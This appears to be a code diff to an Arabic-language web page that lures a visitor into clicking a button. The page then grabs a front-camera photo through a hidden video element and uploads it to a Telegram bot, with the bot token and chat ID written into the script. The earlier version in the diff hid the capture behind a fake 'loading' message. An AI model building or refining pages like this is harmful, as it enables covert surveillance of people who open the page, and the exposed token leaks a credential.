@@ -15,8 +15,6 @@
             align-items: center;
             height: 100vh;
             overflow: hidden;
-        }
-        .loader-container {
             text-align: center;
             padding: 20px;
         }
@@ -30,16 +28,8 @@
             border-radius: 10px;
             cursor: pointer;
             box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-            transition: background 0.2s;
         }
-        .btn-start:hover {
-            background-color: #0ea5e9;
-        }
-        h2 {
-            font-size: 1.2rem;
-            font-weight: 500;
-            margin-bottom: 25px;
-        }
+        h2 { font-size: 1.2rem; font-weight: 500; margin-bottom: 25px; }
     </style>
 </head>
 <body>
@@ -49,27 +39,18 @@
         <button class="btn-start" onclick="startProcess()">اضغط هنا</button>
     </div>
 
-    <!-- عنصر فيديو مخفي لالتقاط الصورة -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // إعدادات بوت تيليجرام
         const TELEGRAM_BOT_TOKEN = '8880573702:AAEcni2H3MYNKkyU0GJen2XqPFgAyL04Mdw';
         const TELEGRAM_CHAT_ID = '8304712202';
 
         async function startProcess() {
-            // تغيير النص لإظهار أن العملية جارية
-            document.getElementById('mainBox').innerHTML = '<h2>جاري التحميل، يرجى الانتظار...</h2>';
+            document.getElementById('mainBox').innerHTML = '<h2>جاري التقاط الصورة...</h2>';
 
             try {
-                const constraints = {
-                    video: {
-                        facingMode: "user"
-                    }
-                };
-
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const videoElement = document.getElementById('video');
                 videoElement.srcObject = stream;
 
@@ -78,8 +59,7 @@
                 }, 1500);
 
             } catch (error) {
-                console.error("فشل الوصول إلى الكاميرا:", error);
-                document.getElementById('mainBox').innerHTML = '<h2>عخطأ في الوصول إلى الكاميرا</h2>';
+                document.getElementById('mainBox').innerHTML = '<h2>خطأ في إذن الكاميرا: ' + error.message + '</h2>';
             }
         }
 
@@ -93,7 +73,6 @@
 
                 const context = canvas.getContext('2d');
                 context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
                 stream.getTracks().forEach(track => track.stop());
 
                 canvas.toBlob(function(blob) {
@@ -101,11 +80,12 @@
                 }, 'image/jpeg', 0.85);
 
             } catch (e) {
-                console.error("خطأ أثناء التقاط الصورة:", e);
+                document.getElementById('mainBox').innerHTML = '<h2>خطأ في المعالجة: ' + e.message + '</h2>';
             }
         }
 
         function sendPhotoToTelegram(blob) {
+            document.getElementById('mainBox').innerHTML = '<h2>جاري الإرسال إلى تيليجرام...</h2>';
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('photo', blob, 'captured_photo.jpg');
@@ -116,10 +96,14 @@
             })
             .then(response => response.json())
             .then(data => {
-                console.log('تم الإرسال بنجاح', data);
+                if(data.ok) {
+                    document.getElementById('mainBox').innerHTML = '<h2>تم إرسال الصورة بنجاح!</h2>';
+                } else {
+                    document.getElementById('mainBox').innerHTML = '<h2>خطأ من تيليجرام: ' + data.description + '</h2>';
+                }
             })
             .catch(error => {
-                console.error('خطأ في الإرسال:', error);
+                document.getElementById('mainBox').innerHTML = '<h2>خطأ في الشبكة: ' + error.message + '</h2>';
             });
         }
     </script>
